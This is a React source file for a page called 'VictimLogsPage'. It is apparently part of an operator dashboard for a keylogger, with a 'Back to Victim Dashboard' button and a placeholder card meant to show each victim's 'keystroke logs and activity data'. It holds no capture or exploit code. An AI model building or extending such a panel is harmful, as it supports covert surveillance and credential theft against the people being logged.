import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { ArrowLeft, Calendar, FileText } from 'lucide-react';

export const VictimLogsPage = () => {
  const { clientId, date } = useParams<{ clientId: string; date: string }>();
  const navigate = useNavigate();

  return (
    <div className="space-y-6">
      {/* Sub Navigation Bar */}
      <div className="border-b border-border bg-card/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center space-x-4">
            <Button
              variant="ghost"
              onClick={() => navigate(`/${clientId}`)}
              className="flex items-center space-x-2"
            >
              <ArrowLeft className="h-4 w-4" />
              <span>Back to Victim Dashboard</span>
            </Button>
            <div className="h-6 w-px bg-border" />
            <div>
              <h2 className="text-lg font-semibold">Session Logs</h2>
              <p className="text-sm text-muted-foreground">
                {date ? new Date(date).toLocaleDateString() : 'All Sessions'}
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <FileText className="h-5 w-5" />
            <span>Logs for {date ? new Date(date).toLocaleDateString() : 'All Sessions'}</span>
          </CardTitle>
          <CardDescription>
            Detailed keystroke logs and activity data
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="text-center py-12">
            <Calendar className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
            <h3 className="text-lg font-medium text-muted-foreground mb-2">
              Logs Coming Soon
            </h3>
            <p className="text-muted-foreground">
              Detailed session logs and keystroke data will be displayed here.
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}; 